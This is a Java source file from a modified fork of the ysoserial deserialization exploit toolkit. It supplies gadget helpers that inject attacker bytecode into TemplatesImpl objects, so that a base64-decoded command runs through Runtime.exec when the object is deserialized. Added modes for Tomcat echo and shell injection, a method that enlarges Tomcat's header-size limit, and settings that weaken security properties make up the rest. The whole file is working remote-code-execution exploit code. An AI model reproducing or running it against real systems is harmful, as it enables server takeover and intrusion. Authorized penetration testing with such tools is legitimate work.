package ysoserial.payloads.util;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import com.nqzero.permit.Permit;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
    "restriction", "rawtypes", "unchecked"
})
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(final String command) throws Exception {
        return createTemplatesImpl(command, null);
    }

    public static Object createTemplatesImpl(final String command, String flag) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }
        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, flag);
    }

    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String c) throws Exception {
        if (c == null) {//正常使用(cmd,null)
            return (T) createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        } else {//add//回显(cmd,notnull)
            final T templates = tplClass.newInstance();
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get("ysoserial.payloads." + command);//用户自定义任意代码执行,修改CustomJavaCode; command=CustomJavaCode//command in [TomcatEchoInject, TomcatEchoShell, TomcatServletResponse1, TomcatServletClassLoader]
            final byte[] classBytes = clazz.toBytecode();
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates;
        }
    }

    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        //add
//        if (command.length() > 1000) {
//            cmd = command;
//        }//end//todo: 优化代码
        cmd = new String(Base64.getDecoder().decode(command.getBytes()));
        System.out.println("cmd:"+cmd);
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws
        Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
        IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    //add
    public static Object createTemplatesImplTomcatHeader(final String command) throws Exception {
        String template = "try {\n" +
            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
            "            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(\"headerBufferSize\");\n" +
            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);\n" +
            "            contextField.setAccessible(true);\n" +
            "            headerSizeField.setAccessible(true);\n" +
            "            serviceField.setAccessible(true);\n" +
            "            requestField.setAccessible(true);\n" +
            "            getHandlerMethod.setAccessible(true);\n" +
            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
            "            for (int i = 0; i < connectors.length; i++) {\n" +
            "                if (4 == connectors[i].getScheme().length()) {\n" +
            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
            "                        for (int j = 0; j < classes.length; j++) {\n" +
            "                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {\n" +
            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
            "                                globalField.setAccessible(true);\n" +
            "                                processorsField.setAccessible(true);\n" +
            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));\n" +
            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
            "                                for (int k = 0; k < list.size(); k++) {\n" +
            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
            "                                    headerSizeField.set(tempRequest.getInputBuffer()," + command + ");\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(" + command + ");\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "        }";
        return createTemplatesImpl(template);
    }
}
